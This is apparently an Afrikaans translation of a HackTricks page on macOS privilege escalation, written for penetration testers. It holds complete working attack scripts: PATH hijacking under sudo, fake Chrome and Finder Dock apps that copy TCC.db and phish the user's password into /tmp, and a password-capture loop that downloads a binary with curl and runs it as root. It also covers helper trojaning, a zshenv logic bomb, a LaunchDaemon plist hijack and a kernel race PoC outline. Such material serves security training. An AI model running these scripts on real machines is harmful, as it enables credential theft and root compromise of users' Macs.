# macOS Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## TCC Privilege Escalation

As jy hierheen gekom het op soek na TCC privilege escalation, gaan na:


{{#ref}}
macos-security-protections/macos-tcc/
{{#endref}}

## Linux Privesc

Let daarop dat **die meeste van die tricks oor privilege escalation wat Linux/Unix raak, ook MacOS**-masjiene sal raak. Kyk dus na:


{{#ref}}
../../linux-hardening/linux-basics/linux-privilege-escalation/README.md
{{#endref}}

## User Interaction

### Sudo Hijacking

Jy kan die oorspronklike [Sudo Hijacking-tegniek in die Linux Privilege Escalation-post](../../linux-hardening/linux-basics/linux-privilege-escalation/index.html#sudo-hijacking) vind.

macOS **behou** egter die gebruiker se **`PATH`** wanneer hy **`sudo`** uitvoer. Dit beteken dat ’n ander manier om hierdie aanval uit te voer, sou wees om **ander binaries te hijack** wat die slagoffer steeds sal uitvoer wanneer hy **sudo uitvoer:**
```bash
# Let's hijack ls in /opt/homebrew/bin, as this is usually already in the users PATH
cat > /opt/homebrew/bin/ls <<'EOF'
#!/bin/bash
if [ "$(id -u)" -eq 0 ]; then
whoami > /tmp/privesc
fi
/bin/ls "$@"
EOF
chmod +x /opt/homebrew/bin/ls

# victim
sudo ls
```
Let daarop dat 'n gebruiker wat die terminal gebruik hoogs waarskynlik **Homebrew geïnstalleer het**. Dit is dus moontlik om binaries in **`/opt/homebrew/bin`** te hijack.

### Dock Impersonation

Deur **social engineering** te gebruik, kan jy byvoorbeeld **Google Chrome** binne die Dock **impersonate** en eintlik jou eie script uitvoer:

{{#tabs}}
{{#tab name="Chrome Impersonation"}}
Enkele voorstelle:

- Kyk in die Dock of daar 'n Chrome is, en indien wel, **verwyder** daardie entry en **voeg** die **fake** **Chrome-entry op dieselfde posisie** in die Dock-array **by**.

<details>
<summary>Chrome Dock impersonation script</summary>
```bash
#!/bin/sh

# THIS REQUIRES GOOGLE CHROME TO BE INSTALLED (TO COPY THE ICON)
# If you want to removed granted TCC permissions: > delete from access where client LIKE '%Chrome%';

rm -rf /tmp/Google\ Chrome.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Google\ Chrome.app/Contents/MacOS
mkdir -p /tmp/Google\ Chrome.app/Contents/Resources

# Payload to execute
cat > /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c <<'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
char *cmd = "open /Applications/Google\\\\ Chrome.app & "
"sleep 2; "
"osascript -e 'tell application \"Finder\"' -e 'set homeFolder to path to home folder as string' -e 'set sourceFile to POSIX file \"/Library/Application Support/com.apple.TCC/TCC.db\" as alias' -e 'set targetFolder to POSIX file \"/tmp\" as alias' -e 'duplicate file sourceFile to targetFolder with replacing' -e 'end tell'; "
"PASSWORD=$(osascript -e 'Tell application \"Finder\"' -e 'Activate' -e 'set userPassword to text returned of (display dialog \"Enter your password to update Google Chrome:\" default answer \"\" with hidden answer buttons {\"OK\"} default button 1 with icon file \"Applications:Google Chrome.app:Contents:Resources:app.icns\")' -e 'end tell' -e 'return userPassword'); "
"echo $PASSWORD > /tmp/passwd.txt";
system(cmd);
return 0;
}
EOF

gcc /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c -o /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome
rm -rf /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c

chmod +x /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

# Info.plist
cat << 'EOF' > /tmp/Google\ Chrome.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CFBundleExecutable</key>
<string>Google Chrome</string>
<key>CFBundleIdentifier</key>
<string>com.google.Chrome</string>
<key>CFBundleName</key>
<string>Google Chrome</string>
<key>CFBundleVersion</key>
<string>1.0</string>
<key>CFBundleShortVersionString</key>
<string>1.0</string>
<key>CFBundleInfoDictionaryVersion</key>
<string>6.0</string>
<key>CFBundlePackageType</key>
<string>APPL</string>
<key>CFBundleIconFile</key>
<string>app</string>
</dict>
</plist>
EOF

# Copy icon from Google Chrome
cp /Applications/Google\ Chrome.app/Contents/Resources/app.icns /tmp/Google\ Chrome.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Google Chrome.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
sleep 0.1
killall Dock
```
</details>

{{#endtab}}

{{#tab name="Finder Impersonation"}}
Enkele voorstelle:

- Jy **kan Finder nie uit die Dock verwyder nie**, dus, as jy dit by die Dock gaan voeg, kan jy die fake Finder net langs die regte een plaas. Hiervoor moet jy **die fake Finder-inskrywing aan die begin van die Dock-array voeg**.
- Nog ’n opsie is om dit nie in die Dock te plaas nie en dit net oop te maak; "Finder asking to control Finder" is nie so vreemd nie.
- Nog ’n opsie om **sonder om te vra na root te eskaleer** sonder die wagwoord, maar met ’n aaklige dialoogvenster, is om Finder werklik vir die wagwoord te laat vra om ’n bevoorregte aksie uit te voer:
- Vra Finder om ’n nuwe **`sudo`-lêer** na **`/etc/pam.d`** te kopieer. (Die versoek wat vir die wagwoord vra, sal aandui dat "Finder wants to copy sudo")
- Vra Finder om ’n nuwe **Authorization Plugin** te kopieer. (Jy kan die lêernaam beheer sodat die versoek wat vir die wagwoord vra, sal aandui dat "Finder wants to copy Finder.bundle")

<details>
<summary>Finder Dock impersonation script</summary>
```bash
#!/bin/sh

# THIS REQUIRES Finder TO BE INSTALLED (TO COPY THE ICON)
# If you want to removed granted TCC permissions: > delete from access where client LIKE '%finder%';

rm -rf /tmp/Finder.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Finder.app/Contents/MacOS
mkdir -p /tmp/Finder.app/Contents/Resources

# Payload to execute
cat > /tmp/Finder.app/Contents/MacOS/Finder.c <<'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
char *cmd = "open /System/Library/CoreServices/Finder.app & "
"sleep 2; "
"osascript -e 'tell application \"Finder\"' -e 'set homeFolder to path to home folder as string' -e 'set sourceFile to POSIX file \"/Library/Application Support/com.apple.TCC/TCC.db\" as alias' -e 'set targetFolder to POSIX file \"/tmp\" as alias' -e 'duplicate file sourceFile to targetFolder with replacing' -e 'end tell'; "
"PASSWORD=$(osascript -e 'Tell application \"Finder\"' -e 'Activate' -e 'set userPassword to text returned of (display dialog \"Finder needs to update some components. Enter your password:\" default answer \"\" with hidden answer buttons {\"OK\"} default button 1 with icon file \"System:Library:CoreServices:Finder.app:Contents:Resources:Finder.icns\")' -e 'end tell' -e 'return userPassword'); "
"echo $PASSWORD > /tmp/passwd.txt";
system(cmd);
return 0;
}
EOF

gcc /tmp/Finder.app/Contents/MacOS/Finder.c -o /tmp/Finder.app/Contents/MacOS/Finder
rm -rf /tmp/Finder.app/Contents/MacOS/Finder.c

chmod +x /tmp/Finder.app/Contents/MacOS/Finder

# Info.plist
cat << 'EOF' > /tmp/Finder.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CFBundleExecutable</key>
<string>Finder</string>
<key>CFBundleIdentifier</key>
<string>com.apple.finder</string>
<key>CFBundleName</key>
<string>Finder</string>
<key>CFBundleVersion</key>
<string>1.0</string>
<key>CFBundleShortVersionString</key>
<string>1.0</string>
<key>CFBundleInfoDictionaryVersion</key>
<string>6.0</string>
<key>CFBundlePackageType</key>
<string>APPL</string>
<key>CFBundleIconFile</key>
<string>app</string>
</dict>
</plist>
EOF

# Copy icon from Finder
cp /System/Library/CoreServices/Finder.app/Contents/Resources/Finder.icns /tmp/Finder.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Finder.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
sleep 0.1
killall Dock
```
</details>

{{#endtab}}
{{#endtabs}}

### Wagwoordprompt-phishing + sudo-hergebruik

Malware misbruik gereeld gebruikersinteraksie om ’n **sudo-bevoegde wagwoord vas te vang** en dit programmaties te hergebruik. ’n Algemene vloei:

1. Identifiseer die aangemelde gebruiker met `whoami`.
2. **Herhaal wagwoordprompts** totdat `dscl . -authonly "$user" "$pw"` suksesvol terugkeer.
3. Kas die credential (bv. `/tmp/.pass`) en voer bevoorregte aksies met `sudo -S` uit (wagwoord oor stdin).

Minimale voorbeeldketting:
```bash
user=$(whoami)
while true; do
read -s -p "Password: " pw; echo
dscl . -authonly "$user" "$pw" && break
done
printf '%s\n' "$pw" > /tmp/.pass
curl -o /tmp/update https://example.com/update
printf '%s\n' "$pw" | sudo -S xattr -c /tmp/update && chmod +x /tmp/update && /tmp/update
```
Die gesteelde password kan dan hergebruik word om **Gatekeeper quarantine met `xattr -c` te clear**, LaunchDaemons of ander privileged files te kopieer, en bykomende stages non-interactively uit te voer.

## Nuwer macOS-spesifieke vectors (2023–2025)

### Deprecated `AuthorizationExecuteWithPrivileges` steeds usable

`AuthorizationExecuteWithPrivileges` is in 10.7 deprecated, maar **werk steeds op Sonoma/Sequoia**. Baie commercial updaters invokeer `/usr/libexec/security_authtrampoline` met ’n untrusted path. As die target binary user-writable is, kan jy ’n trojan plant en die legitieme prompt benut:
```bash
# find vulnerable helper calls
log stream --info --predicate 'eventMessage CONTAINS "security_authtrampoline"'

# replace expected helper
cp /tmp/payload /Users/me/Library/Application\ Support/Target/helper
chmod +x /Users/me/Library/Application\ Support/Target/helper
# when the app updates, the root prompt spawns your payload
```
Kombineer dit met die **masquerading tricks hierbo** om ’n geloofwaardige wagwoorddialoog aan te bied.


### Privileged helper / XPC-triage

Baie moderne derdeparty-macOS privescs volg dieselfde patroon: ’n **root LaunchDaemon** stel ’n **Mach/XPC service** vanuit **`/Library/PrivilegedHelperTools`** bloot, waarna die helper óf **nie die client valideer nie**, dit **te laat valideer** (PID race), óf ’n **root method** blootstel wat ’n **user-controlled path/script** gebruik. Dit is die bugklas agter baie onlangse helper-bugs in VPN clients, game launchers en updaters.

Vinnige triage-kontrolelys:
```bash
ls -l /Library/PrivilegedHelperTools /Library/LaunchDaemons
plutil -p /Library/LaunchDaemons/*.plist 2>/dev/null | rg 'MachServices|Program|ProgramArguments|Label'
for f in /Library/PrivilegedHelperTools/*; do
echo "== $f =="
codesign -dvv --entitlements :- "$f" 2>&1 | rg 'identifier|TeamIdentifier|com.apple'
strings "$f" | rg 'NSXPC|xpc_connection|AuthorizationCopyRights|authTrampoline|/Applications/.+\.sh'
done
```
Gee spesiale aandag aan helpers wat:

- aanhou om versoeke **na deïnstallering** te aanvaar omdat die job in `launchd` gelaai gebly het
- scripts uitvoer of konfigurasie lees vanaf **`/Applications/...`** of ander paaie wat deur nie-root-gebruikers geskryf kan word
- op **PID-gebaseerde** of **slegs bundle-id-gebaseerde** peer validation staatmaak wat moontlik deur ’n race condition misbruik kan word

Vir meer besonderhede oor helper authorization bugs, kyk na [hierdie bladsy](macos-proces-abuse/macos-ipc-inter-process-communication/macos-xpc/macos-xpc-authorization.md).

### PackageKit script environment inheritance (CVE-2024-27822)

Totdat Apple dit in **Sonoma 14.5**, **Ventura 13.6.7** en **Monterey 12.7.5** reggestel het, kon gebruiker-geïnisieerde installasies via **`Installer.app`** / **`PackageKit.framework`** **PKG-scripts as root binne die huidige gebruiker se omgewing** uitvoer. Dit beteken dat ’n package wat **`#!/bin/zsh`** gebruik, die aanvaller se **`~/.zshenv`** sou laai en dit as **root** uitvoer wanneer die slagoffer die package geïnstalleer het.

Dit is veral interessant as ’n **logic bomb**: jy benodig slegs ’n foothold in die gebruiker se account en ’n shell-startuplêer wat geskryf kan word; daarna wag jy totdat enige kwesbare **zsh-gebaseerde** installer deur die gebruiker uitgevoer word. Dit is oor die algemeen nie van toepassing op **MDM/Munki**-deployments nie, omdat hulle binne die root-gebruiker se omgewing uitgevoer word.
```bash
# inspect a vendor pkg for shell-based install scripts
pkgutil --expand-full Target.pkg /tmp/target-pkg
find /tmp/target-pkg -type f \( -name preinstall -o -name postinstall \) -exec head -n1 {} \;
rg -n '^#!/bin/(zsh|bash)' /tmp/target-pkg

# logic bomb example for vulnerable zsh-based installers
echo 'id > /tmp/pkg-root' >> ~/.zshenv
```
As jy dieper wil delf in installer-spesifieke misbruik, kyk ook na [hierdie bladsy](macos-files-folders-and-binaries/macos-installers-abuse.md).

### LaunchDaemon plist hijack (CVE-2025-24085 pattern)

As ’n LaunchDaemon plist of sy `ProgramArguments`-teiken **user-writable** is, kan jy eskaleer deur dit te vervang en dan launchd te dwing om te herlaai:
```bash
sudo launchctl bootout system /Library/LaunchDaemons/com.apple.securemonitor.plist
cp /tmp/root.sh /Library/PrivilegedHelperTools/securemonitor
chmod 755 /Library/PrivilegedHelperTools/securemonitor
cat > /Library/LaunchDaemons/com.apple.securemonitor.plist <<'PLIST'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0"><dict>
<key>Label</key><string>com.apple.securemonitor</string>
<key>ProgramArguments</key>
<array><string>/Library/PrivilegedHelperTools/securemonitor</string></array>
<key>RunAtLoad</key><true/>
</dict></plist>
PLIST
sudo launchctl bootstrap system /Library/LaunchDaemons/com.apple.securemonitor.plist
```
Dit weerspieël die exploit-patroon wat vir **CVE-2025-24085** gepubliseer is, waar ’n skryfbare plist misbruik is om aanvallerkode as root uit te voer.

### XNU SMR credential race (CVE-2025-24118)

’n **Race in `kauth_cred_proc_update`** laat ’n plaaslike aanvaller toe om die leesalleen credential pointer (`proc_ro.p_ucred`) te korrupteer deur `setgid()`/`getgid()`-lusse oor threads heen te laat race totdat ’n geskeurde `memcpy` plaasvind. Suksesvolle korrupsie lewer **uid 0** en toegang tot kernel memory. Minimale PoC-struktuur:
```c
// thread A
while (1) setgid(rand());
// thread B
while (1) getgid();
```
Kombineer met heap grooming om beheerde data te plaas waar die pointer weer gelees word. Op kwesbare builds is dit ’n betroubare **local kernel privesc** sonder SIP bypass-vereistes.

### SIP bypass via Migration assistant ("Migraine", CVE-2023-32369)

Selfs as jy reeds root het, blokkeer SIP steeds writes na system locations. Die **Migraine**-bug misbruik die Migration Assistant entitlement `com.apple.rootless.install.heritable` om ’n child process te spawn wat SIP bypass erf en protected paths (byvoorbeeld `/System/Library/LaunchDaemons`) oorskryf. Die chain:

1. Kry root op ’n live system.
2. Trigger `systemmigrationd` met crafted state om ’n attacker-controlled binary uit te voer.
3. Gebruik die inherited entitlement om SIP-protected files te patch, wat selfs ná ’n reboot behoue bly.

### NSPredicate/XPC expression smuggling (CVE-2023-23530/23531 bug class)

Verskeie Apple daemons aanvaar **NSPredicate**-objects oor XPC en valideer slegs die `expressionType`-field, wat deur die attacker beheer word. Deur ’n predicate te craft wat arbitrêre selectors evalueer, kan jy **code execution in root/system XPC services** (byvoorbeeld `coreduetd`, `contextstored`) verkry. Wanneer dit met ’n aanvanklike app sandbox escape gekombineer word, verleen dit **privilege escalation sonder user prompts**. Soek na XPC endpoints wat predicates deserialize en nie ’n robuuste visitor het nie.

## TCC - Root Privilege Escalation

### CVE-2020-9771 - mount_apfs TCC bypass and privilege escalation

**Enige gebruiker** (selfs unprivileged gebruikers) kan ’n Time Machine snapshot met `-o noowners` create en mount, en **ALLE files** van daardie snapshot access, waardeur die ownership checks op die live volume omseil word. Die enigste privilege wat nodig is, is dat die application wat gebruik word (soos `Terminal`) **Full Disk Access** (`kTCCServiceSystemPolicyAllfiles`) moet hê.

Die commands en die volledige verduideliking is op die TCC bypasses-bladsy:

{{#ref}}
macos-security-protections/macos-tcc/macos-tcc-bypasses/README.md
{{#endref}}

## Sensitive Information

Dit kan nuttig wees om privileges te escalate:


{{#ref}}
macos-files-folders-and-binaries/macos-sensitive-locations.md
{{#endref}}

## References

- [Microsoft "Migraine" SIP bypass (CVE-2023-32369)](https://www.microsoft.com/en-us/security/blog/2023/05/30/new-macos-vulnerability-migraine-could-bypass-system-integrity-protection/)
- [CVE-2025-24118 SMR credential race write-up & PoC](https://github.com/jprx/CVE-2025-24118)
- [CVE-2024-27822: macOS PackageKit Privilege Escalation](https://khronokernel.com/macos/2024/06/03/CVE-2024-27822.html)
- [CVE-2024-30165: AWS Client VPN for macOS Local Privilege Escalation](https://blog.emkay64.com/macos/CVE-2024-30165-finding-and-exploiting-aws-client-vpn-on-macos-for-local-privilege-escalation/)

{{#include ../../banners/hacktricks-training.md}}
